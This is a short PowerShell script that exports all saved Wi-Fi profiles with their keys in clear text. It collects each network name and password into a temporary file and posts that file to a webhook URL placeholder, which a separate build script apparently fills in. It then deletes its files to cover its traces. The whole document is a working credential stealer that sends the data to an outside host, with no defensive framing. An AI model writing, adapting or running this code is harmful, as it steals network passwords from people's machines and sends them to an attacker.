# Define temporary directory and file to work with
$TempPath = Join-Path -Path $env:TEMP -ChildPath 'WiFiProfiles'
$TempFile = Join-Path -Path $TempPath -ChildPath 'All-Wi-Fi.txt'

# Create temporary directory if it doesn't exist
if (-not (Test-Path -Path $TempPath -PathType Container)) {
    New-Item -Path $TempPath -ItemType Directory -Force | Out-Null
}

# Export Wi-Fi profiles to temporary directory
netsh.exe wlan export profile folder=$TempPath key=clear | Out-Null

# Save names and passwords in temporary file
Select-String -Pattern '<keyMaterial>(.*)</keyMaterial>' -Path $TempPath\*Wi-Fi*.xml -CaseSensitive | ForEach-Object {
    $Name = $_.Filename -creplace '^Wi-Fi-|\.xml$'
    $Password = $_.Matches[0].Groups[1].Value
    $Name + ':' + $Password | Out-File -FilePath $TempFile -Encoding utf8 -Append
}

# Send temporary file through web request
# Do not change 'WEBHOOK_URL_HERE' (./src/modify_scripts.py will need it)
Invoke-WebRequest -Uri 'WEBHOOK_URL_HERE' -UseBasicParsing -Method Post -ContentType 'text/html; charset=utf-8' -InFile $TempFile

# Delete every directory and file created
Remove-Item -Path $TempPath -Recurse -Force
exit